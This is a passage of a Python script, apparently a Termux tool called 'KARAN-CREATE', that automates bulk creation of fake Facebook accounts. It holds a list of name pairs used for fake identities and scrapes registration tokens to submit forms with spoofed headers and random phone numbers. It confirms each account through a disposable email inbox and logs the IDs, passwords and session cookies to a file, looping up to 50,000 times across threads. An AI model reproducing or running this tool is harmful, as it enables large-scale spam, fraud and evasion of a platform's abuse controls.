'Ch|Asad', 'Nadeem|Rao', 'Raja|Nawaz', 'Rana|Iqbal', 'S|Rao', 'Rana|Maqsood', 'Rao|Qasim', 'Rana|Zahid', 'راؤ|عرفان', 'M|Jamshed', 'Rao|Imran', 'Shahzad|Rajpoot', 'Rana|Shahzaib', 'Muhammad|Sikandar', 'راناعامر|راناعامر', 'Rao|Hasnain', 'Rana|Asif', 'Javed|Rana', 'Raoiqrar|Raoiqrar', 'Zaheer|Rana', 'Mudassir|Rajput', 'Rana|Awais', 'Rao|Waseem', 'Ali|Rao', 'Rao|Asif', 'Haseeb|Rajput', 'Rana|Rizwan', 'Rana|Shuaib', 'Rana|Shoaib', 'Rao|Shoaib', 'Rajpoot|Arslan', 'Rao|Muzammil', 'Rana|Rashid', 'Rana|Shahbaz', 'Rao|Inaam', 'رانا|ندیم', 'Arslan|Rao', 'Rana|Shakeel', 'Zeeshan|Rana', 'Rana|Mansoor', 'رانا|عاطف', 'Bilal|Prince', 'Rana|Shokat', 'Rana|Babar', 'M|Jafar', 'Ranaiqrar|Ranaiqrar', 'Rao|Imran', 'Rao|Arif', 'Fatima|Rajpoot', 'Nomii|Rajput', 'Rao|Junaid', 'Hasnaat|Rajput', 'Rao|Haleem', 'عبداللہ|راجپوت', 'Shoiab|Rana', 'رانا|دانی', 'Rao|Tasawar', 'Sunny|Rao', 'ᎷᎥᏗᏁ|ᏕᏬᏝᏖᏗᏁ', 'Sajjad|Rao', 'Sardar|Ijaz', 'Rao|Akbar', 'Rana|Usama', 'Mujahid|Khanbadani', 'Rao|Amjid', 'Rana|Ahsan', 'Rana|Akram', 'Adnan|Rana', 'Imran|Ashraf', 'Rajab|Rajput', 'Rao|Shakir', 'Rana|Usman', 'رانا|ارسلان', 'رضا|سعید', 'Rao|Tariq', 'Saad|Rajpoot', 'Parvaiz|Parvaiz', 'Rana|Dilo', 'Rana|Rashid', 'Rana|Asif', 'Rao|Ali', 'Sultan|Rao', 'Rana|Umair', 'Rao|Saad', 'Rao|Farhan', 'Rana|Babar', 'Raja|Sahib', 'Umer|Wakeel', 'Rao|M', 'Arslan|Rao', 'Rao|Mudassar', 'Rajpoot|Ramzanrajpoot', 'Wasim|Rao', 'Bilal|Rana', 'Shahbaz|Rajpoot', 'M|Asif', 'Rana|Aftab', 'Usama|Rao', 'Rao|Abdul', 'Amir|Sohail', 'Rafiq|Khan', 'Rao|Tanveer', 'Rana|Fahim', 'Rana|Afaq', 'Rana|Jabbar', 'Rana|Zain', 'Rao|Talha', 'Ahmad|Raza', 'M|Rao', 'Brand|Rao', 'Rao|Waseem', 'Rana|Zeshan', 'Adeel|Khalil', 'Rana|Ahamd', 'Rana|Sajid', 'Rana|Bilal', 'Rao|Amir', 'Rao|Asif', 'Farhad|Rao', 'Rao|Kashif', 'Ibrar|Rajput', 'Rao|Aftab', 'Muhammad|Ali', 'Rao|Ali', 'Hassan|Rajput', 'Rao|Mazhar', 'Rao|F', 'Sijawal|Rana', 'Rana|Intizar', 'Rana|Husnain', 'Rao|Babar', 'Rana|Uzair', 'عثمان|احمد', 'Rana|Ali', 'Rana|Waseem', 'Rana|Rehan', 'Rana|Ahmad', 'Rao|Touqeer', 'Rana|Shahid', 'Rao|Abid', 'Azeem|Rao', 'Rana|Imran', 'Rana|Asgher', 'Rao|Raza', 'Rana|Hussain', 'Rao|Shahryar', 'Rao|G', 'Nouman|Rajpoot', 'Rao|Faisal', 'Rao|Saim', 'Rana|Shahid', 'Rana|Adnan', 'Usman|Usman', 'Rajpoot|Putter', 'Hafiz|Ahtsham', 'Rana|Nadeem', 'Moon|Rao', 'Shana|Rao', 'Rao|Fakhar', 'Rana|Imran', 'Rajpoot|Sufyan', 'Malik|Fiaz']
    def process(pas,mmail):
        global ok
        import requests,re
        requests=requests.Session()
        cookies=None
        def find(txtt,wrd):
               xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
               return xx                      
        import requests,re,random
        requests=requests.Session()
        cookies=None
        ua=random_ua()
        from fake_email import Email
        mmail=Email().Mail()
        def rnd(a,b):
            return str(random.randint(a,b))
        em=mmail['mail']
        num="03"+rnd(10,49)+rnd(1111111,9999999)
        headers1 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url1 = 'https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk'
        data1 = None
        response1 = requests.get(url1, headers=headers1, data=data1)    
        headers2 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url2 = 'https://mbasic.facebook.com/reg/submit/'
        data2 = {
            'lsd': find(response1.text,"lsd"),
            'jazoest': find(response1.text,"jazoest"),
            'ccp': '2',
            'reg_instance': find(response1.text,"reg_instance"),
            'reg_impression_id': find(response1.text,"reg_impression_id"),
            'ns': '0',
            'app_id': find(response1.text,"app_id"),
            'logger_id': find(response1.text,"logger_id"),
            'suma_create_event': 'suma_redirection_click_create_account',
            'field_names[0]': 'firstname',
            'field_names[1]': 'birthday_wrapper',
            'field_names[2]': 'reg_email__',
            'field_names[3]': 'sex',
            'field_names[4]': 'reg_passwd__',
            'is_birthday_confirmed': 'confirmed',
            'multi_step_form': '1',
            'skip_suma': '0',
            'shouldForceMTouch': '1',
            'ref': 'dbl',
            'firstname': random.choice(m).split("|")[0]+" "+random.choice(m).split("|")[1],
            'reg_email__': num,
            'sex': '1',
            'reg_passwd__':pas,
            'birthday_day': rnd(10,27),
            'birthday_month': '3',
            'birthday_year': rnd(1978,1999),
            'welcome_step_completed': True,
            'submission_request': True,
            'age_step_input': False,
            'did_use_age': False,
            'custom_gender': False,
            'name_suggest_elig': False,
            'was_shown_name_suggestions': False,
            'did_use_suggested_name': False,
            'use_custom_gender': False,
            'zero_header_af_client': '',
            'helper': '',
            'guid': '',
            'pre_form_step': '',
            'korean_tos_is_present': '',
            'checkbox_privacy_policy': '',
            'checkbox_tos': '',
            'checkbox_location_policy': ''}
        response = requests.post(url2, headers=headers2, data=data2)
        response=requests.get("https://mbasic.facebook.com")
        if "checkpoint" in response.text:
            return "chk"
        headers = {
        'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
        'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Window"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '21',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
        for i in  re.findall('href="/changeemail(.*?)"',response.text):
          url="/changeemail"+i
        response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
        headers = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Window"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
        data = {
            'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),
            'old_email': re.search('name="old_email" value="(.*?)"',str(response.text)).group(1),
            'reg_instance': re.search('name="reg_instance" value="(.*?)"',str(response.text)).group(1),
            'new': em,
            'next': '',
            'submit': 'Add'}
        url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
        submit = requests.post(url, headers=headers, data=data)
        r=requests.get("https://mbasic.facebook.com")
        while True:
            h=Email(mmail["session"]).inbox()
            if h:
                j = h['topic'].split('-')[1];hh = j.split(' ')[0]
                cd = hh
                break
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Window',
            'sec-ch-ua-platform-version': '11.0.0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
        data = {'contact': em,
            'type': 'submit',
            'is_soft_cliff': False,
            'medium': 'email',
            'code': cd,
            'fb_dtsg': find(r.text,"fb_dtsg"),
            'jazoest': find(r.text,"jazoest"),
            '__user': dict(requests.cookies)['c_user']}
        url = 'https://m.facebook.com/confirmation_cliff/'
        response = requests.post(url, headers=headers, data=data)
        return requests
    def strt():
       try:
           global ok,loop,cp,ok1
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [KARAN-CREATE] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           hd = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/reg', 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent':random_ua()}
           if "9":
              pas=random.choice(m).replace('|','').lower()+rnd(1111,9999)
              requests=process(pas,mmail)
              if requests=="chk":
                print("\r\r\033[1;32m [KARAN-CP] "+uid+'|'+pas+'|'+coki)
                cp+=1
                pass
              elif requests=="0":pass
              else:
                 dc=dict(requests.cookies)
                 cok=";".join([k+"="+v for k,v in dc.items()])
                 uid=re.findall("c_user=(.*?);",cok)[0]
                 coki = cvt('ok',requests.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
                 print("\r\r\033[1;32m [KARAN-OK] "+uid+'|'+pas+'|'+coki)
                 ok+=1
                 open('/sdcard/KARAN-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 linex()
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    file="/sdcard/ KARAN CREATE-OK.txt"
    u=5000
    clear()
    for i in range(50000):
       import time
       time.sleep(2)
       thread(max_workers=10).submit(strt)


menu()
